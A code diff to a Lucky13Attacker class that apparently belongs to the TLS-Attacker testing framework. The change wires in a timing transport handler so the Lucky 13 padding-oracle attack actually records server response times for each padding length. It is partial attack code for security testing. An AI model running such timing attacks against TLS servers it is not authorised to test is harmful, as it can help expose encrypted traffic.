@@ -26,6 +26,7 @@ import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
 import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
 import de.rub.nds.tlsattacker.core.workflow.action.ReceiveAction;
 import de.rub.nds.tlsattacker.core.workflow.action.SendAction;
+import de.rub.nds.tlsattacker.transport.tcp.timing.TimingClientTcpTransportHandler;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.util.Collections;
@@ -33,6 +34,7 @@ import java.util.HashMap;
 import java.util.LinkedList;
 import java.util.List;
 import java.util.Map;
+import java.util.logging.Level;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
@@ -48,6 +50,8 @@ public class Lucky13Attacker extends Attacker<Lucky13CommandConfig> {
     private final Map<Integer, List<Long>> results;
 
     private long lastResult;
+
+    private TimingClientTcpTransportHandler transportHandler;
 
     public Lucky13Attacker(Lucky13CommandConfig config) {
         super(config, false);
@@ -72,9 +76,14 @@ public class Lucky13Attacker extends Attacker<Lucky13CommandConfig> {
         }
     }
 
-    public void executeAttackRound(Record record) {
+    public void executeAttackRound(Record record) throws IOException {
         Config tlsConfig = config.createConfig();
+        tlsConfig.setWorkflowExecutorShouldOpen(false);
         TlsContext tlsContext = new TlsContext(tlsConfig);
+        transportHandler = new TimingClientTcpTransportHandler(tlsConfig.getTimeout(), tlsConfig.getHost(),
+                tlsConfig.getPort());
+        transportHandler.initialize();
+        tlsContext.setTransportHandler(transportHandler);
         WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
                 tlsConfig.getWorkflowExecutorType(), tlsContext);
 
@@ -95,8 +104,7 @@ public class Lucky13Attacker extends Attacker<Lucky13CommandConfig> {
             LOGGER.info("Not possible to finalize the defined workflow.");
             LOGGER.debug(ex);
         }
-        lastResult = 0;// TODO
-                       // tlsContext.getTransportHandler().getLastMeasurement();
+        lastResult = transportHandler.getLastMeasurement();
 
     }
 
@@ -139,14 +147,19 @@ public class Lucky13Attacker extends Attacker<Lucky13CommandConfig> {
         for (int i = 0; i < config.getMeasurements(); i++) {
             LOGGER.info("Starting round {}", i);
             for (int p : paddings) {
-                Record record = createRecordWithPadding(p);
-                executeAttackRound(record);
-                if (results.get(p) == null) {
-                    results.put(p, new LinkedList<Long>());
-                }
-                // removeTlsAction the first 20% of measurements
-                if (i > config.getMeasurements() / 5) {
-                    results.get(p).add(lastResult);
+                try {
+                    Record record = createRecordWithPadding(p);
+                    executeAttackRound(record);
+                    if (results.get(p) == null) {
+                        results.put(p, new LinkedList<Long>());
+                    }
+                    // removeTlsAction the first 20% of measurements
+                    if (i > config.getMeasurements() / 5) {
+                        results.get(p).add(lastResult);
+                    }
+                } catch (IOException ex) {
+                    LOGGER.warn("Problem while running Padding: " + p);
+                    LOGGER.error(ex);
                 }
             }
         }
